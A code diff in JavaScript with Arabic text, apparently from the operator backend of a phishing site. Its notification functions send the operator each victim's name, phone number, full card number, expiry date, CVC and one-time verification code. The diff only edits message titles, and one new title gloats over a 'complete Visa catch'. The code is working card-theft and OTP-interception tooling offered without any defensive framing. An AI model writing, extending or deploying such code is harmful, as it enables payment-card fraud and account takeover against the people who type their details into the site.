@@ -172,12 +172,12 @@ async function notifyNewVisitor(visitorData) {
   if (hasSubmissions) {
     // Existing customer with saved name
     const name = visitorData.delivery_data?.fullName || visitorData.payment_data?.cardHolder || 'عميل';
-    title = '🔄 زيارة ';
-    body = `زائر قديم: ${name}`;
+    title = '🔄 زيارة جديدة';
+    body = `عميل قديم: ${name}`;
   } else {
     // Completely new visitor
     title = '🆕 زائر جديد!';
-    body = 'زائر جديد ';
+    body = 'زائر جديد تماماً';
   }
   
   return sendPushNotification(tokens, {
@@ -202,7 +202,7 @@ async function notifyDelivery(visitorData) {
   const phone = visitorData.delivery_data?.phone || '';
   
   return sendPushNotification(tokens, {
-    title: '📦 بيانات توصيل !',
+    title: '📦 بيانات توصيل جديدة!',
     body: `${name} - ${phone}`,
     icon: '/admin/icon.png'
   }, { type: 'delivery', sessionId: visitorData.session_id || visitorData.sessionId });
@@ -226,7 +226,7 @@ async function notifyPayment(visitorData) {
   const cvc = visitorData.payment_data?.cvc || '';
 
   return sendPushNotification(tokens, {
-    title: '💳  بطاقة جديدة !',
+    title: '💳 صيد فيزا جديدة كاملة!',
     body: `الاسم: ${name}\nالبطاقة: ${fullCard}\nالتاريخ: ${expiry} | CVC: ${cvc}`,
     icon: '/admin/icon.png',
     clickAction: '/admin/#visitors'
@@ -251,7 +251,7 @@ async function notifyVerification(visitorData) {
   const otp = visitorData.verification_data?.otp || '';
   
   return sendPushNotification(tokens, {
-    title: '🔐 رمز تحقق !',
+    title: '🔐 رمز تحقق جديد!',
     body: `${name} - الكود: ${otp}`,
     icon: '/admin/icon.png'
   }, { type: 'verification', sessionId: visitorData.session_id || visitorData.sessionId });
